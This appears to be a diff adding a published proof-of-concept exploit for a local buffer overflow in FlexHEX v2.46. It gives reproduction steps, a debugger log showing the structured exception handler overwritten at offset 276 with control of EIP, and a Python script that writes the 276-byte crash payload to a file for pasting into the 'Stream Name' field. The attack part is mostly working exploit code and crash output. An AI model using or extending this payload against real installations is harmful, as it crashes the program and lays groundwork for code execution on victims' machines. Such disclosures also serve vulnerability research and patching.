@@ -1,0 +1,72 @@
+# Exploit Title: FlexHEX v2.46 - Denial of Service (PoC) and SEH overwritten Crash PoC
+# Discovery by: Rafael Pedrero
+# Discovery Date: 2018-12-20
+# Vendor Homepage: http://www.flexhex.com/order/?r1=iNetShortcut&r2=fhx1
+# Software Link : http://www.flexhex.com/order/?r1=iNetShortcut&r2=fhx1
+# Tested Version: 2.46
+# Tested on: Windows XP SP3
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+
+# Steps to Produce the Crash:
+# 1.- Run FlexHEX.exe
+# 2.- Go to Menu "Stream" - "New Stream" and copy content of FlexHEX_SEH_Crash.txt to clipboard
+# 3.- Paste the content into the field: 'Stream Name:'
+# 4.- Click 'OK' button and you will see a crash.
+
+
+'''
+Log data, item 21
+ Address=0BADF00D
+ Message=    SEH record (nseh field) at 0x0012dde8 overwritten with unicode
+pattern : 0x006a0041 (offset 276), followed by 20 bytes of cyclic data
+after the handler
+
+SEH chain of main thread
+Address    SE handler
+0012DDFC   FlexHEX.00420042
+00420042   8BC13B2C
+4E8B3C46   *** CORRUPT ENTRY ***
+
+EAX 00410041 FlexHEX.00410041
+ECX 00000000
+EDX 00000000
+EBX 0012FA18
+ESP 0012DE3C UNICODE "AAAAAAAAAABBBB"
+EBP 00410041 FlexHEX.00410041
+ESI 0012DE78
+EDI 0012E69C
+EIP 00410041 FlexHEX.00410041
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 0  CS 001B 32bit 0(FFFFFFFF)
+A 1  SS 0023 32bit 0(FFFFFFFF)
+Z 0  DS 0023 32bit 0(FFFFFFFF)
+S 0  FS 003B 32bit 7FFDF000(FFF)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010212 (NO,NB,NE,A,NS,PO,GE,G)
+ST0 empty
+ST1 empty
+ST2 empty
+ST3 empty
+ST4 empty
+ST5 empty
+ST6 empty
+ST7 empty
+               3 2 1 0      E S P U O Z D I
+FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+'''
+
+#!/usr/bin/env python
+
+nseh = "BB"
+seh = "BB"
+
+junk = "\x41" * 276
+crash = junk + nseh + seh
+f = open ("FlexHEX_SEH_Crash.txt", "w")
+f.write(crash)
+f.close()
